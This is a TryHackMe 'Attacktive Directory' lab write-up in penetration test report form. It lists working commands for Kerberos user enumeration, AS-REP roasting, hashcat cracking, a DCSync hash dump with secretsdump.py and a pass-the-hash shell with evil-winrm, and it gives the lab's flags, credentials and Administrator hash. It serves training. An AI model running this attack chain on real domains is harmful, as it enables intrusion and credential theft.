# TryHackMe — Attacktive Directory: Penetration Test Report

**Target:** `10.48.160.211` (ATTACKTIVEDIRECTORY, domain `spookysec.local`)
**Attacker host:** THM AttackBox (`10.48.86.152`)
**Date:** 23 November 2026
**Objective:** Enumerate and compromise a Windows Active Directory Domain Controller, escalating from anonymous network access to Domain Administrator.

---

## 1. Executive Summary

This engagement targeted a single Windows Server 2019 Domain Controller for the domain `spookysec.local`. Using only unauthenticated network access, it was possible to:

1. Enumerate valid AD usernames via Kerberos.
2. Identify an account vulnerable to **AS-REP Roasting** (no Kerberos pre-authentication required).
3. Crack that account's password offline with a wordlist.
4. Use the cracked credentials to read an SMB share containing a Base64-encoded password for a second, more privileged account.
5. Use that second account to dump the entire domain's password hashes (including the Administrator's) via a DCSync-style attack.
6. Log in directly as **Administrator** using the hash alone (pass-the-hash), with no need to crack it.
7. Retrieve flags from the Administrator, `svc-admin`, and `backup` user desktops.

**Root cause:** Weak account hygiene (no pre-auth required on `svc-admin`, a weak password, and a plaintext/Base64 credential left on an SMB share) combined with excessive privileges on a secondary account, allowing a full domain compromise from an anonymous starting point.

---

## 2. Tools Used

| Tool | Purpose |
|---|---|
| `nmap` | Port/service discovery |
| `crackmapexec` / `netexec` | SMB enumeration, domain/OS fingerprinting, credential validation |
| `kerbrute` | Kerberos-based username enumeration |
| Impacket `GetNPUsers.py` | AS-REP Roasting (request hashes for accounts with no pre-auth) |
| `hashcat` | Offline password cracking |
| `smbclient` | SMB share browsing/file download |
| base64decode.org | Decoding a Base64 credential string |
| Impacket `secretsdump.py` | Dumping domain password hashes (NTDS.DIT secrets) |
| `evil-winrm` | Remote PowerShell shell via WinRM, using pass-the-hash |

---

## 3. Step-by-Step Walkthrough

### Step 1 — Port Scanning

A full TCP port scan was run against the target:

```
nmap -p- -T4 -v 10.48.160.211
```

![Full port scan in progress](images/attactive-dc-1.png)

The scan completed and revealed a classic Active Directory Domain Controller port footprint: DNS (53), Kerberos (88), RPC (135), SMB (139/445), LDAP (389/636/3268/3269), WinRM (5985/47001), and RDP (3389).

![Completed nmap results showing AD ports](images/attactive-dc-2.png)

**What this tells us:** This is a Domain Controller (LDAP + Kerberos + SMB together is the signature). This immediately points toward AD-specific attacks rather than generic web/service exploitation.

### Step 2 — Confirming the Domain Name

`crackmapexec`/`netexec` was used against SMB to fingerprint the host:

```
crackmapexec smb 10.48.160.211
```

![Identifying the domain name spookysec.local](images/attactive-dc-3.png)

This revealed the hostname `ATTACKTIVEDIRECTORY` and, critically, the domain name **`spookysec.local`** — needed for every subsequent Kerberos/LDAP command.

### Step 3 — Username Enumeration via Kerberos

A wordlist of candidate usernames (`userlist.txt`) was downloaded, then fed to `kerbrute`, which abuses the Kerberos pre-authentication process to test which usernames exist on the domain (Kerberos gives a different error for "user doesn't exist" vs. "user exists, wrong password"):

```
kerbrute userenum -d spookysec.local --dc 10.48.160.211 userlist.txt
```

![kerbrute discovering valid usernames](images/attactive-dc-4.png)

This returned a list of **valid usernames** (e.g. `james`, `svc-admin`, `robin`, `darkstar`, `administrator`, `backup`, `paradox`, `ori`), without needing any credentials at all.

### Step 4 — AS-REP Roasting

The valid usernames were saved to `valid_users.txt` and tested with Impacket's `GetNPUsers.py`, which asks the KDC for a Kerberos ticket **without** supplying a password. If an account has the attribute `UF_DONT_REQUIRE_PREAUTH` set, the KDC will happily hand back an encrypted ticket (the "AS-REP") that can be cracked offline:

```
python3.9 /opt/impacket/examples/GetNPUsers.py spookysec.local/ -dc-ip 10.48.160.211 -usersfile valid_users.txt -request
```

![GetNPUsers.py returning an AS-REP hash for svc-admin](images/attactive-dc-5.png)

Only one account, **`svc-admin`**, had pre-authentication disabled, and its AS-REP hash (`$krb5asrep$23$svc-admin@...`) was captured for offline cracking.

**What this means:** Kerberos pre-authentication exists specifically to stop this kind of attack. An account with it disabled is handing an attacker a crackable password hash with zero authentication required.

### Step 5 — Cracking the AS-REP Hash

The captured hash was cracked offline with `hashcat`, mode `18200` (Kerberos 5, etype 23, AS-REP), against a password wordlist:

```
hashcat -m 18200 hash.txt passwordlist.txt
```

![hashcat starting the AS-REP cracking job](images/attactive-dc-6.png)

Within seconds, the password was recovered:

![hashcat reporting the cracked password: svc-admin : management2005](images/attactive-dc-7.png)

**Credential obtained:** `svc-admin : management2005`

### Step 6 — Validating Credentials and Enumerating Shares

The cracked credentials were validated against SMB and used to list available shares:

```
netexec smb 10.48.160.211 -u 'svc-admin' -p 'management2005' --shares
```

(output visible at the top of the next two screenshots)

A non-default share called **`backup`** stood out, readable by this account. After a couple of failed attempts against the wrong IP, the share was accessed on the correct DC address:

```
smbclient //10.48.160.211/backup -U 'svc-admin'
```

![Connecting to the backup share and listing its contents](images/attactive-dc-8.png)

Inside was a single file: `backup_credentials.txt`. It was downloaded:

![Downloading backup_credentials.txt from the share](images/attactive-dc-9.png)

### Step 7 — Decoding the Backup Credentials

The file's contents were printed and turned out to be a Base64 string:

![cat backup_credentials.txt showing a Base64 blob](images/attactive-dc-10.png)

That string was decoded using an online Base64 decoder:

![Base64 decode revealing backup:backup2517860](images/attactive-dc-11.png)

**Credential obtained:** `backup@spookysec.local : backup2517860`

**What this means:** The `backup` account is, by AD design intent, a member of a privileged group used for system/domain backups — which typically carries **replication rights** over the domain, equivalent to Domain Admin capability for extracting secrets.

### Step 8 — Dumping All Domain Hashes (DCSync)

With the `backup` account's credentials, Impacket's `secretsdump.py` was run against the Domain Controller. Because the `backup` account has directory-replication permissions, this performs a **DCSync attack** — impersonating a Domain Controller to pull every account's password hash straight out of the NTDS database:

```
secretsdump.py spookysec.local/backup:backup2517860@10.48.160.211
```

![secretsdump.py dumping NTLM hashes for every domain account](images/attactive-dc-12.png)

This dumped NTLM hashes and Kerberos AES keys for **every account in the domain**, including:

- `Administrator:500:...:0e0363213e37b94221497260b0bcb4fc:::`
- `krbtgt`, `svc-admin`, `backup`, and all other domain users

![Additional AES/DES Kerberos keys dumped for all users](images/attactive-dc-13.png)

### Step 9 — Pass-the-Hash as Administrator

The Administrator's NTLM hash did not need to be cracked at all — NTLM hashes can be used directly for authentication ("pass-the-hash"). `evil-winrm` was used to open a PowerShell session over WinRM using the hash:

```
evil-winrm -i 10.48.160.211 -u 'Administrator' -H '0e0363213e37b94221497260b0bcb4fc'
```

This dropped into an interactive shell as `thm-ad\administrator`, confirmed with `whoami`, and the root flag was retrieved from the Administrator's desktop:

```
TryHackMe{4ctiveD1rectoryM4st3r}
```

![Administrator shell via pass-the-hash, root flag retrieved](images/attactive-dc-13.png)

### Step 10 — Collecting Remaining Flags

Still inside the Administrator WinRM session, the other users' desktops were checked. The `svc-admin` desktop contained a user flag:

```
TryHackMe{K3rb3r0s_Pr3_4uth}
```

![svc-admin user flag retrieved](images/attactive-dc-14.png)

And the `backup` account's desktop contained a privilege-escalation flag:

```
TryHackMe{B4ckM3UpSc0tty!}
```

![backup account PrivEsc flag retrieved](images/attactive-dc-15.png)

---

## 4. Attack Chain Summary

```
Anonymous network access
        │
        ▼
Port scan → identify Domain Controller (spookysec.local)
        │
        ▼
kerbrute → enumerate valid usernames (no auth needed)
        │
        ▼
GetNPUsers.py → AS-REP Roast svc-admin (no pre-auth required)
        │
        ▼
hashcat → crack svc-admin's password ("management2005")
        │
        ▼
SMB (as svc-admin) → read "backup" share → backup_credentials.txt
        │
        ▼
Base64 decode → backup account's plaintext password
        │
        ▼
secretsdump.py (DCSync as backup) → dump ALL domain hashes
        │
        ▼
evil-winrm pass-the-hash → Administrator shell → full domain compromise
```

## 5. Key Takeaways / Lessons Learned

- **Kerberos pre-authentication should never be disabled** on service accounts — it's a direct and trivially exploitable path to a crackable password hash (AS-REP Roasting).
- **Weak passwords undermine every other control.** `management2005` was cracked almost instantly with a basic wordlist.
- **Never store credentials in files on shares**, even "obfuscated" with Base64 — Base64 is encoding, not encryption, and is reversible in seconds.
- **The `backup` account is extremely dangerous if compromised.** Built-in backup operator privileges are functionally equivalent to Domain Admin because they allow replication/DCSync-style secret extraction.
- **NTLM hashes are as good as passwords.** Once an NTLM hash is obtained, no cracking is required — it can be used directly to authenticate (pass-the-hash), which is why hash dumps must be treated with the same sensitivity as plaintext credentials.

## 6. Flags Captured

| Flag | Value | Source |
|---|---|---|
| Root flag | `TryHackMe{4ctiveD1rectoryM4st3r}` | Administrator desktop |
| User flag | `TryHackMe{K3rb3r0s_Pr3_4uth}` | svc-admin desktop |
| PrivEsc flag | `TryHackMe{B4ckM3UpSc0tty!}` | backup desktop |
